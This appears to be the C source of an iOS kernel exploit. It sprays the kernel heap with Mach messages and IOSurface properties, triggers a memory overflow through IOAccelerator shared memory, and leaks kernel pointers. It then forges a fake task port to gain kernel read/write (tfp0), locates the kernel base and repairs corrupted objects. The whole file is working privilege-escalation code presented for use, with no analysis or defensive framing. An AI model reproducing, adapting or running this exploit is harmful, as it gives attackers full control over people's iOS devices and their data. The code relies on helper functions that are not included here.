#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/time.h>
#include <mach/mach.h>
#include <stddef.h>
#include <mach/mach_time.h>
#include "time_saved.h"

#define try(cond,fail,success) if(cond){printf("[-] %s\n",fail);goto err;}if(strlen(success)!=0)printf("[*] %s\n",success);
#define simple_sz sizeof(struct simple_msg)

#define MB * 1024 * 1024
#define is_4k(yes, no) (ps == 0x1000 ? yes : no)

#define port_cnt 100
#define POP_PORT() ports[port_i++]

uint64_t kernel_base = 0;
uint64_t self_struct_task = 0;
uint64_t kern_struct_task = 0;
uint64_t our_task_addr = 0;

static inline uint32_t mach_port_waitq_flags() {
    union waitq_flags waitq_flags = {};
    waitq_flags.waitq_type              = WQT_QUEUE;
    waitq_flags.waitq_fifo              = 1;
    waitq_flags.waitq_prepost           = 0;
    waitq_flags.waitq_irq               = 0;
    waitq_flags.waitq_isvalid           = 1;
    waitq_flags.waitq_turnstile_or_port = 1;
    return waitq_flags.flags;
}

// thx siguza!
uint64_t find_port_via_cuck00(mach_port_t port) {
    uint64_t A = 0x4141414141414141;
    uint64_t refs[8] = {A,A,A,A,A,A,A,A};
    uint64_t in[3] = {0,0,0};
    uint64_t id = IOSurface_ID;

    if (IOConnectCallAsyncStructMethod(IOSurfaceRootUserClient, 17, port, refs, 8, in, sizeof(in), NULL, NULL)) return 0;
    if (IOConnectCallScalarMethod(IOSurfaceRootUserClient, 14, &id, 1, NULL, NULL)) return 0;
    if (IOConnectCallScalarMethod(IOSurfaceRootUserClient, 15, &id, 1, NULL, NULL)) return 0;
    
    struct {
        mach_msg_header_t head;
        struct {
            mach_msg_size_t size;
            natural_t type;
            uintptr_t ref[8];
        } notify;
        struct {
            kern_return_t ret;
            uintptr_t ref[8];
        } content;
        mach_msg_max_trailer_t trailer;
    } msg = {};
    
    if (mach_msg(&msg.head, MACH_RCV_MSG, 0, sizeof(msg), port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL)) return 0;
    return msg.notify.ref[0] & ~3;
}

int start_time_saved(void) {
    clock_t start, end;
    double cpu_time_used;
    start = clock();  // Record the starting time

    void *data = NULL;
    mach_port_t ports[port_cnt] = {};
    mach_port_t new_tfp0 = MACH_PORT_NULL;

    // init our offsets and IO*
    try(init_offsets(),
        "iOS version not supported", "initialized offsets");
    
    try(init_IOAccelerator(),
        "failed to init IOAccelerator", "initialized IOAccelerator");
    
    try(init_IOSurface(),
        "failed to init IOSurface", "initialized IOSurface");

    for (int i = 0; i < port_cnt; i++) ports[i] = new_mach_port();
    int port_i = 0;
    
    printf("[*] Doing stage 0 heap setup\n");
    mach_port_t saved_ports[10];
    mach_msg_size_t msg_size = msg_sz_kalloc(7 * ps) - simple_sz;
    data = calloc(1, msg_size);
    
    size_t stage0_sz = ps == 0x4000 ? 10 MB : 5 MB;
    for (int i = 0; i < 10; i++) {
        saved_ports[i] = POP_PORT();
        for (int j = 0; j < stage0_sz / (7 * ps); j++) {
            try(send_message(saved_ports[i], data, msg_size),
                "Failed to send message", "");
        }
    }
    
    free(data);
    data = NULL;
    
    for (int i = 0; i < 10; i+=2) {
        mach_port_destroy(mach_task_self(), saved_ports[i]);
        if (i == 4) i--;
    }
    
    mach_port_t spray = POP_PORT();
    msg_size = msg_sz_kalloc(8 * ps) - simple_sz;
    data = calloc(1, msg_size);
    for (int i = 0; i < MACH_PORT_QLIMIT_LARGE; i++) {
        try(send_message(spray, data, msg_size),
            "Failed to send message", "");
    }
   
    printf("[*] Doing stage 1 heap setup\n");
    int property_index = 0;
    uint32_t huge_kalloc_key = transpose(property_index++);
    struct IOAccelDeviceShmemData cmdbuf, seglist;
    
    try(IOSurface_empty_kalloc(82 MB, huge_kalloc_key),
        "Failed to allocate empty kalloc buffer", "");
    
    try(alloc_shmem(96 MB, &cmdbuf, &seglist),
        "Failed to allocate shared memory", "");

    mach_port_t corrupt_port = POP_PORT();
    try(send_message(corrupt_port, data, (uint32_t)msg_sz_kalloc(8 * ps) - simple_sz),
        "Failed to send message", "");
    
    mach_port_t placeholder_message_port = POP_PORT();
    try(send_message(placeholder_message_port, data, (uint32_t)msg_sz_kalloc(8 * ps) - simple_sz),
        "Failed to send message", "");

    mach_port_t ool_message_port = POP_PORT();
    int ool_ports_count = (7 * ps) / sizeof(uint64_t) + 1;
    
    try(send_ool_ports(ool_message_port, ool_ports_count),
        "Failed to send ool ports message", "");
    
    try(IOSurface_remove_property(huge_kalloc_key),
        "Failed to remove IOSurface property", "");
    
    void *spray_buffer = ((uint8_t *) cmdbuf.data) + ps;
    uint32_t kfree_buffer_key = transpose(property_index++);
    memset(spray_buffer, 0x42, 8 * ps);
    
    try(IOSurface_kmem_alloc_spray(spray_buffer, 8 * ps, is_4k(72, 80)MB / (8 * ps), kfree_buffer_key),
        "Failed to spray", "");
    
    mach_port_destroy(mach_task_self(), placeholder_message_port);
    uint32_t spray_key = transpose(property_index++);
    
    try(IOSurface_kmem_alloc_spray(spray_buffer, 8 * ps, is_4k(82, 80)MB / (8 * ps), spray_key),
        "Failed to spray", "");
    
    size_t min = is_4k(0x17fa8, 0x5ffa8);

retry:;
    int overflow = 0;
    uint64_t ts = mach_absolute_time();
    
    if (min < ts && ts <= ((min << 8) | 0xff)) overflow = 8;
    else if (((min<<8)|0xff)<ts && ts<=((min<<16)|0xffff)) overflow = 7;
    else if (((min<<16)|0xffff)<ts && ts<=((min<<24)|0xffffff)) overflow = 6;
    else if (((min<<24)|0xffffff)<ts && ts<=((min<<32)|0xffffffff)) overflow = 5;
    else if (((min<<32)|0xffffffff)<ts && ts<=((min<<36)|0xffffffffff)) overflow = 4;
    else if (((min<<36)|0xffffffffff)<ts && ts<=((min<<40)|0xffffffffffff)) overflow = 3;
    
    uint32_t ipc_kmsg_size = (uint32_t) (ts >> (8 * (8 - overflow)));
    if (ipc_kmsg_size < (min + 1) || ipc_kmsg_size > 0x0400a8ff) {
        printf("[-] trying to get a new timestamp...\n");
        usleep(100);
        goto retry;
    }
    
    printf("[*] Triggering bug with %d bytes\n", overflow);
    overflow_n_bytes(96 MB, overflow, &cmdbuf, &seglist);
    printf("[*] Corruption worked?\n");

    mach_port_destroy(mach_task_self(), corrupt_port);
    printf("[*] Freed kmsg\n");
    mach_port_t msg_leak = POP_PORT();
    
    for (int i = 0; i < is_4k(720, 1024); i++)
        try(send_message(msg_leak, data, (uint32_t)msg_sz_kalloc(8 * ps) - simple_sz),
            "Failed to send message", "");
    
    mach_port_t msg_leak2 = MACH_PORT_NULL;
    if (ps == 0x1000) {
        msg_leak2 = POP_PORT();
        for (int i = 0; i < 720; i++)
            try(send_message(msg_leak2, data, (uint32_t)msg_sz_kalloc(8 * ps) - simple_sz),
                "failed to send message", "");
    }
    
    free(data);
    data = NULL;
    
    uint32_t argsSz = sizeof(struct IOSurfaceValueArgs) + 2 * sizeof(uint32_t);
    struct IOSurfaceValueArgs *in = malloc(argsSz);
    bzero(in, argsSz);
    in->surface_id = IOSurface_ID;
    in->binary[0] = spray_key;
    in->binary[1] = 0;
    
    size_t out_size = 96 MB; // make it bigger than actual; that works for both cases
    try(IOSurface_getValue(in, 16, spray_buffer, &out_size),
        "Failed to read back value", "");

    free(in);
    uint32_t ikm_size = 8 * (uint32_t)ps - 0x58;
    void *ipc_kmsg = memmem(spray_buffer, out_size, &ikm_size, sizeof(ikm_size));
    try(!ipc_kmsg,
        "Failed to leak ipc_kmsg", "");
    
    uint64_t ikm_header = *(uint64_t*)(ipc_kmsg + 24);
    uint64_t segment_list_addr = ikm_header - 96 MB - 96 MB - 8 * ps - 2 * ps - 0x28;
    
    printf("[+] ikm_header leak: 0x%llx\n", ikm_header);
    printf("[+] Segment list calculated to be at: 0x%llx\n", segment_list_addr);
    
    uint64_t fake_port_page_addr = segment_list_addr + 96 MB;
    uint64_t fake_port_addr = fake_port_page_addr + 0x100;
    uint64_t fake_task_page_addr = segment_list_addr + ps + 96 MB;
    uint64_t fake_task_addr = fake_task_page_addr + 0x100;
    
    data = malloc(8 * ps);
    for (int i = 0; i < 8 * ps / 8; i++) ((uint64_t*)data)[i] = fake_port_addr;
    mach_port_destroy(mach_task_self(), msg_leak);
    if (msg_leak2) mach_port_destroy(mach_task_self(), msg_leak2);
    
    uint32_t ool_ports_realloc_key = transpose(property_index++);
    try(IOSurface_kmem_alloc_spray(data, 8 * ps, 1000, ool_ports_realloc_key),
        "Failed to spray", "");
    
    make_buffer_readable_by_kernel(cmdbuf.data, 2);
    memset(cmdbuf.data, 0, 2 * ps);
    
    kport_t *fake_port = cmdbuf.data + 0x100;
    ktask_t *fake_task = cmdbuf.data + ps + 0x100;
    uint8_t *fake_port_page = cmdbuf.data;
    uint8_t *fake_task_page = cmdbuf.data + ps;

    *(fake_port_page + 0x16) = 42;
#if __arm64e__
    *(fake_task_page + 0x16) = 57;
#else
    *(fake_task_page + 0x16) = 58;
#endif
        
    fake_port->ip_bits = IO_BITS_ACTIVE | IKOT_TASK;
    fake_port->ip_references = 0xd00d;
    fake_port->ip_lock.type = 0x11;
    fake_port->ip_messages.port.receiver_name = 1;
    fake_port->ip_messages.port.msgcount = 0;
    fake_port->ip_messages.port.qlimit = MACH_PORT_QLIMIT_LARGE;
    fake_port->ip_messages.port.waitq.flags = mach_port_waitq_flags();
    fake_port->ip_srights = 99;
    fake_port->ip_kobject = fake_task_addr;
        
    fake_task->ref_count = 0xff;
    fake_task->lock.data = 0x0;
    fake_task->lock.type = 0x22;
    fake_task->ref_count = 100;
    fake_task->active = 1;
    
    struct ool_msg *ool = (struct ool_msg *)receive_message(ool_message_port, sizeof(struct ool_msg) + 0x1000);
    mach_port_t fakeport = ((mach_port_t *)ool->ool_ports.address)[0];
    free(ool);
    ool = NULL;
    
    try(!fakeport,
        "failed to get fakeport", "");
    printf("[+] fakeport: 0x%x\n", fakeport);
    
    uint64_t leaked_port_addr = find_port_via_cuck00(ool_message_port);
    try(!leaked_port_addr,
        "Failed to leak port address", "");
    
    printf("[+] Leaked port: 0x%llx\n", leaked_port_addr);

    uint64_t *read_addr_ptr = (uint64_t *)((uint64_t)fake_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
    uint64_t ipc_space = kr64(leaked_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER));
    try(!ipc_space, "Kernel read failed", "Got kernel read");
    
    uint64_t kernel_vm_map = 0;
    uint64_t ipc_space_kernel = 0;
    uint64_t our_port_addr = 0;
    
    uint64_t struct_task = kr64(ipc_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TASK));
    our_port_addr = kr64(struct_task + koffset(KSTRUCT_OFFSET_TASK_ITK_SELF));
    ipc_space_kernel = kr64(our_port_addr + offsetof(kport_t, ip_receiver));
    
    while (struct_task) {
        uint64_t bsd_info = kr64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
        if (kr32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID)) == 0) {
            kernel_vm_map = kr64(struct_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP));
            kern_struct_task = struct_task;
            break;
        } else if (kr32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID)) == getpid()) {
            self_struct_task = struct_task;
        }
        struct_task = kr64(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV));
    }

    fake_port->ip_receiver = ipc_space_kernel;
    *(uint64_t *)((uint64_t)fake_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP)) = kernel_vm_map;
    *(uint32_t *)((uint64_t)fake_task + koffset(KSTRUCT_OFFSET_TASK_ITK_SELF)) = 1;
    init_kernel_memory(fakeport, our_port_addr);
    uint64_t addr = kalloc(8);
    try(!addr,
        "tfp0 port seems to not be working", "");
    
    printf("[*] allocated: 0x%llx\n", addr);
    wk64(addr, 0x4141414141414141);
    
    uint64_t readb = rk64(addr);
    kfree(addr, 8);
    try(readb != 0x4141414141414141,
        "read back value didn't match", "");
    
    printf("[*] read back: 0x%llx\n", readb);
    
    new_tfp0 = POP_PORT();
    try(!new_tfp0,
        "failed to allocate new tfp0 port", "");
    
    uint64_t new_addr = find_port(new_tfp0);
    try(!new_addr,
        "failed to find new tfp0 port addresst", "");
    
    uint64_t faketask = kalloc(ps);
    try(!faketask,
        "failed to kalloc faketask", "");

    kwrite(faketask, fake_task_page, ps);
    fake_port->ip_kobject = faketask + 0x100;
    kwrite(new_addr, (const void*)fake_port, sizeof(kport_t));
    init_kernel_memory(new_tfp0, our_port_addr);
    
    addr = kalloc(8);
    try(!addr,
        "tfp0 port seems to not be working", "");
    
    printf("[+] tfp0: 0x%x\n", new_tfp0);
    printf("[*] Allocated: 0x%llx\n", addr);
    
    wk64(addr, 0x4141414141414141);
    readb = rk64(addr);
    kfree(addr, 8);
    
    try(readb != 0x4141414141414141,
        "Read back value didn't match", "");
    
    printf("[*] Read back: 0x%llx\n", readb);

    uint64_t IOSurface_port_addr = find_port(IOSurfaceRootUserClient);
    uint64_t IOSurface_object = rk64(IOSurface_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    uint64_t vtable = rk64(IOSurface_object);
    vtable |= 0xffffff8000000000;
    uint64_t function = rk64(vtable + 8 * koffset(OFFSET_GETFI));
    function |= 0xffffff8000000000;
    uint64_t page = trunc_page_kernel(function);
   
    while (true) {
        if (rk64(page) == 0x0100000cfeedfacf && (rk64(page + 8) == 0x0000000200000000 || rk64(page + 8) == 0x0000000200000002)) {
            kernel_base = page; break;
        }
        page -= ps;
    }

    printf("[-] cleaning up...\n");
    our_task_addr = rk64(our_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    uint64_t itk_space = rk64(our_task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
    uint64_t is_table = rk64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
    uint32_t port_index = fakeport >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    
    wk32(is_table + (port_index * sizeof_ipc_entry_t) + 8, 0);
    wk64(is_table + (port_index * sizeof_ipc_entry_t), 0);
    fakeport = MACH_PORT_NULL;
    port_index = new_tfp0 >> 8;
    uint32_t ie_bits = rk32(is_table + (port_index * sizeof_ipc_entry_t) + 8);
    ie_bits &= ~MACH_PORT_TYPE_RECEIVE;
    wk32(is_table + (port_index * sizeof_ipc_entry_t) + 8, ie_bits);
    
    uint64_t spray_array = address_of_property_key(IOSurfaceRootUserClient, spray_key); // OSArray *
    uint32_t count = OSArray_objectCount(spray_array);
    for (int i = 0; i < count; i++) {
        uint64_t object = OSArray_objectAtIndex(spray_array, i); // OSData *
        uint64_t buffer = OSData_buffer(object);
        if (buffer == segment_list_addr + 96 MB + 96 MB + 8 * ps) {
            printf("[*] Found corrupted OSData buffer at 0x%llx\n", buffer);
            OSData_setLength(object, 0); // null out the size, this buffer was freed & reallocated
            break;
        }
    }
    
    IOSurface_remove_property(spray_key);
    uint64_t ool_array = address_of_property_key(IOSurfaceRootUserClient, ool_ports_realloc_key); // OSArray *
    count = OSArray_objectCount(ool_array);
    for (int i = 0; i < count; i++) {
        uint64_t object = OSArray_objectAtIndex(ool_array, i); // OSData *
        uint64_t buffer = OSData_buffer(object);
        if (buffer == segment_list_addr + 96 MB + 96 MB + 8 * ps + 8 * ps) {
            printf("[*] Found corrupted OSData buffer at 0x%llx\n", buffer);
            OSData_setLength(object, 0);
            break;
        }
    }
    
    IOSurface_remove_property(ool_ports_realloc_key);
    uint64_t kfree_array = address_of_property_key(IOSurfaceRootUserClient, kfree_buffer_key); // OSArray *
    count = OSArray_objectCount(kfree_array);
    uint64_t start_of_corruption = segment_list_addr + 96 MB + 96 MB + 8 * ps + 8 * ps + 8 * ps;
    
    for (int i = 0; i < count; i++) {
        uint64_t object = OSArray_objectAtIndex(kfree_array, i); // OSData *
        uint64_t buffer = OSData_buffer(object);
        if (buffer >= start_of_corruption) {
            uint64_t page = 0;
            for (int p = 0; p < 8; p++) {
                page = buffer + p * ps;
                if (mach_vm_allocate(new_tfp0, &page, ps, VM_FLAGS_FIXED)) {
                    uint64_t readval = rk64(page);
                    if (readval == 0x4242424242424242) {
                        printf("[*] fixing corrupted OSData buffer at 0x%llx\n", buffer);
                        OSData_setBuffer(object, page);
                        OSData_setLength(object, 8 * ps - (uint32_t)(page - buffer));
                        goto out;
                    } else printf("[*] part of buffer reallocated by the system, keeping\n");
                } else kfree(page, ps);
            }
            OSData_setLength(object, 0);
        }
    }
    
out:;
    IOSurface_remove_property(kfree_buffer_key);
    
err:;
    for (int i = 0; i < port_cnt; i++)
        if (ports[i] && ports[i] != new_tfp0) mach_port_destroy(mach_task_self(), ports[i]);
    if (data) free(data);
    
    term_IOAccelerator();
    term_IOSurface();
    
    end = clock();cpu_time_used = ((double) (end - start)) / CLOCKS_PER_SEC;
    printf("tfp0 in: %.2f milliseconds\n", cpu_time_used * 1000.0f);
    return new_tfp0;
}
